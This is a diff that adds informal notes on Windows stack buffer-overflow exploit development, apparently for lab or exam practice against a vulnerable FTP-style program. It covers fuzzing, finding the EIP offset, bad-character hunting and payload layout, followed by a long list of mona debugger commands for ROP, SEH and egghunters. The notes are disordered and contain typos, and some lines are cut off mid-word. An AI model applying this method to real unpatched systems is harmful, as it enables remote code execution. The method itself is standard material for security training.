@@ -81,5 +81,160 @@ exploit/multi/misc/wireshark_lwres_getaddrbyname_loop
 
 
 
+########
+1: open debugger , as admin 
+2: run vuln.exe as admin 
+3: attach vuln.exe 
+4: enter F9 to start vuln.exe
+*:^type: !mona config -set workingfolder C:\b00f\%p
+5: go to Linux: and start nc -nvv ip port or ur script.
+6: fuzz to find crash bytes..! best send 100 re-send 150 re-send 500
+*:^on python fz.py add: b0f = "A" * 146 #keep connection
+*:^crashed with 41414141 remember ESP + EIP + 146,Next,Not crashed?try again.
+*:^dont do nothing, type : !mona pc 146 and copy from text c:\b00f\
+*:^on python bad.py: b0f = "A" * 146 + "B" * 4 
+7: if EIP 42424242 , Good, otherwise keep 4+6
+if you found bad chart from step 7 for ->follow dump> find it.! next.
+8: type: !mona bytearray -cpb '\xff\x0a'
+9: open C:\b00f\bytearray.exe and paste it to exp.py
+10: open exp1.py : b0x = "A" * 146 + "B" * 4 + bytearray
+11: set necessary breakpoints mona cmd + restart vuln.exe 
+12: ready? send exp1.py and go windows :
+13: if your bytearray hit breakpint good, shoud be in memory somewhere
+14: !mona compare -f C:\b00f\bytearray.bin
+output = unmodified GOOD :) 
+Find the location (probably on the stack in this example) where EIP 
+would jump to. If you are building an exploit for a saved return 
+pointer overwrite, you will most likely find your payload at ESP.
+Look at ESP (or the location where your payload is) and jot down that address.
+Open compare.txt, look for that address and you will get the list of bytes
+that were corrupted. Corruption can result in 2 types of behaviour : 
+either the byte gets changed (other bytes are still fine), or all bytes
+after the bad char are different. Either way, unless you know what you are
+doing, only write down the first byte that was changed and add that byte
+to the list of bad chars. Then repeat the entire process (create bytearray, 
+paste array into exploit, trigger crash, compare). So, if you discovery 
+that for example \x59 is a bad char too, 
+#simply run the bytearray command again :
+!mona bytearray -cpb ‘\x00\x0a\x0d’
+Repeat the entire process and do another compare. 
+If the resulting array was found at the right location, 
+unmodified, <--------------------------#################
+then you have determined all bad chars. 
+If not, just find the next bad char, exclude it from the array 
+and try again. The process might be time consuming
+Repeat the entire process and do another compare. 
+
+################ 
+
+15: set the necessary breakpoint, and the byte array 
+"D"*(4064-296-8-len(SHELLCODE))
+
+16: we are ready to hack, open exp.py, format will be like
+
+######## 2
+!mona findmsp -distance 2000
+^ look for EIP contains normal pattern offset xxxx)
+!mona compare -f C:\b00f\PCManFTPD2\bytearray.bin -a 0019EcE0
+!mona compare -f C:\b00f\PCManFTPD2\bytearray.bin -a 0019EcE0
+!mona bytearray -cpb '\x03\x05\x06\x07\x08\x09\x00\x01\x02\x04\x0a\x0b\x0c\x0d\x0e'
+!mona jmp -r esp -cpb "\x03\x05\x06\x07\x08\x09\x00\x01\x02\x04\x0a\x0b\x0c\x0d\x0e"
+!mona deferbp -a 0x0019ece0
+!mona stackpivot -distance 4,4
+
+now find the bad chars and when you do : \xff\x0a
+before you run 3rd time the python, Find : mona
+!mona find -s "\xff\x0a" -m kernel32.dll
+!mona asm -s "jmp esp"
+!mona bpseh
+!mona sehbp
+!mona geteat
+!mona getiat
+!mona breakfunc -t list -f export -s *
+!mona breakfunc -t list -f import -s *
+egghunter -f C:\b00f\shellcode.txt
+egghunter -depsize 2000
+egghunter -depdest 
+!mona enc -s 146
+!mona find -type asc -s "w00t"
+!mona enc  -t alphanum -s 146
+#to copy 0x10 bytes to another address:
+!mona copy -src 0x00446000 -dst 0x00446010 -n 0x10
+#Set a memory breakpoint on read/write or execute of given address
+!mona deferbp -a address
+TO PRINT BAD CHART FROM TO TEST :
+!mona bytearray
+!mona find -type instr -s "jmp ecx" -p2p
+!mona eat -s "32"
+!mona getpc -r esp
+!mona nosafesehaslr
+!mona offset
+!mona pc     #get a exception EIP address
+!mona po EIP #return the offset
+!mona peb    #show location of the PEB
+!mona rop    #ROP exploit
+!mona ropfunc # pointers to pointers (IAT) 
+!mona seh #find SEH overwrite exploits
+!mona sehchain #show SEH chain
+!mona skeleton  #create metasploit module
+!mona stacks  #show stacks running
+!mona stackpivot  #find stackpivots
+!mona string # read and write string from to memory
+!mona config -set excluded_modules "Lang.dll"
+!mona config -add excluded_modules "module3.dll"
+!mona config -set author MetaSploitUser
+!mona assemble -s "pop eax#inc ebx#ret"
+!mona bf -t ADD -f import -s *mem* -m myapp.exe
+#set a breakpoint on a given address, which will be trigge
+!mona bp -a 0x0019ece0 -t READ
+# first, get all stackpivots, save output to c:\logs\stackpivot.txt
+!mona config -set workingfolder c:\logs
+!mona stackpivot -distance 4,4
+# read the file and find ptr to ptr-58 to each of the pointers
+!mona find -type file -s "c:\logs\stackpivot.txt" -x *
+      -offset 88 -level 2 -offsetlevel 2
+!mona bp -t READ -a 0x7a10b473
+
+!mona bf -t ADD -f import -s 
+
+### !mona jmp -r where is a vaild register
+### !mona jop  will search for gadgets that can be used in a JOP (Ju
+offset
+
+This command will show the distance between 2 addresses, and will show the offset in hex which can be used to make a jump forward or backwards.
+
+Mandatory arguments :
+
+    -a1 : the start address or register
+    -a2 : the end address or register
+
+
+#######################
+!mona rop -m "Lang.dll" -distance 2000
+###################
+
+
+# When you start sending first python to change to 41414141 
+# python must be : A*146
+# dont change AAAA -> req A*146,
+# we might not even be able to control EIP anymore
+
+::::::::after overwrttien::::::::
+1 - set breakpoint on EIP and then compare 
+On Linux go to : 
+cd /opt/metasploit-framework/embedded/framework/tools/exploit
+ruby pattern_offset.rb -q 39654138
+result will be : Exact match at offset 146
+^-- if that good? go to next step..if not same make sure from line 36
+2 - Next Step 
+go to windows : DONT STOP ATTACH OR CLOSE IT AFTER OVERWRITTING
+after you found bad chars >>
+type : 
+!mona bytearry -cpb '\xff\x0a'
+^-- copy the output from byearray.txt
+^-- and put the array instead of 500 bytes
+1: set necessary breakpointt at EIP.
+
+# python must be : A*146 + EIP + 500 bytes (shellcode)
 
 
